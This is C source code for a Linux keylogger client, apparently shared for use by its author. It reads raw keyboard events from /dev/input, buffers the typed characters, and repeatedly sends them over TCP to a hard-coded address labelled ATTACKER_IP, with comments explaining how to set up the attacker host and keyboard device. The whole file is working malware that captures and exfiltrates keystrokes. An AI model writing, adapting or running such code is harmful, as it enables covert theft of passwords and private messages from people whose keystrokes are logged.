#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>

//feel free to change these 
//make sure this is the same port as the server key logger
#define PORT 87
//change this to the attacker ip (the ip of your host device)
#define ATTACKER_IP "192.168.175.137"
//if these instructions are confusing please reach out to me on discord @Skomo
//change to the correct file using cat /proc/bus/input/devices look for the Sysfs which should have the envnt number under a decvice named "AT Translated Set 2 keyboard"
// you sould see something like S: Sysfs=/devices/platform/i8042/serio0/input/input1
// if it is not input 1 then you must change event 1 below. DO NOT CHANGE /dev/input/ ONLY CHANGE event# 
#define KEYBOARD_FILE "/dev/input/event1"

int main() {
    struct input_event ev;
	int fd = open(KEYBOARD_FILE , O_RDONLY);
	char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
    char keys[50];
    int count = 0;

    while(1){
        while(count < 49){
		read(fd, &ev, sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
			switch(ev.code)
			{
				case 28:
					keys[count] = '\n';
                    //printf("char:%c, count:%d\n", keys[count], count);
                    count++;
					break;
				case 57:
					keys[count] = ' ';
                    //printf("char:%c, count:%d\n", keys[count], count);
                    count++;
					break;
                case 14:
                    count--;
                    //printf("char:backspace, count:%d\n", count);
                    break;
				default:
					keys[count] = map[ev.code];
                    //printf("char:%c, count:%d\n", keys[count], count);
                    count++;
			}
		}
	}
    keys[49] = '\0';

    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, ATTACKER_IP , &serv_addr.sin_addr)<=0) {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }
    //send the keystrokes
    send(sock, keys, strlen(keys), 0);
    //printf("sending: %s, \nlength of keys: %d", keys, strlen(keys));
    count = 0;

    }
    close(fd);

}

